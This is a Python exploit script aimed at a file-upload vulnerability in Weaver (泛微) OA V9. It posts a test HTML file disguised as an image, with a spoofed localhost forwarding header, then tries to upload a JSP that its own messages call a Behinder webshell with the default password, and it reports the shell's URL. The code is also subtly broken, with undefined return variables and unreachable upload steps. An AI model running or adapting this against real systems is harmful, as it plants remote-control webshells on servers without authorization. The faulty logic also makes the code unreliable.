# -*- coding: utf-8 -*-

import re
import time
import requests
import os

def now_time():
    return time.strftime("[%H:%M:%S] ", time.localtime())
  
def main(target_url):
    if target_url[:4]!='http':
        target_url = 'http://' + target_url
    if target_url[-1]!='/':
        target_url += '/'  
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "x-forwarded-for":"127.0.0.1", 
        }
    vuln_url=target_url+"page/exportImport/uploadOperation.jsp"
    exp_url= target_url+"page/exportImport/fileTransfer/index123.html"
    current_dir = os.path.dirname(os.path.abspath(__file__))
# 拼接相对路径
    file_path1 = os.path.join(current_dir,  'poc', 'index123.html')
    file_path2 = os.path.join(current_dir,  'poc', 'index123.jsp')

    file1 = [('file1', ('index123.html', open(file_path1, 'rb'), 'image/png'))]
    file2 = [('file1', ('index123.jsp', open(file_path2, 'rb'), 'image/png'))]
    success_msg1 = now_time() + '[SUCCESS]测试文件上传成功'
    shell_msg1 = now_time() + ':{}'.format(exp_url)

    warning_msg = now_time() + '[WARNING]上传失败，原因可能存在防火墙请手动上传'
    error_msg = now_time() + '[泛微oa V9 文件上传漏洞][ERROR]请求失败，可能无法与目标建立连接或目标不存在'
    try:
        requests.packages.urllib3.disable_warnings()
        url = requests.post(vuln_url, headers=headers, files=file1, verify=False)
        cs  = requests.get(exp_url, headers=headers, verify=False)
        if cs.status_code== 200 and '123456' in cs.text:
            return success_msg,shell_msg
            url = requests.post(vuln_url, headers=headers, files=file2, verify=False)
            exp_url= target_url+"page/exportImport/fileTransfer/index123.jsp"
            GS  = requests.get(exp_url, headers=headers, verify=False)
            success_msg2 = now_time() + '[SUCCESS]冰蝎默认密码文件上传成功'
            shell_msg2 = now_time() + ':{}'.format(exp_url)
            if GS.status_code== 200:
                return success_msg,shell_msg
            else:
                return warning_msg
        else:
            return now_time() + ' [WARNING]  泛微oa V9 文件上传漏洞不存在'
    except:
         return error_msg
 


        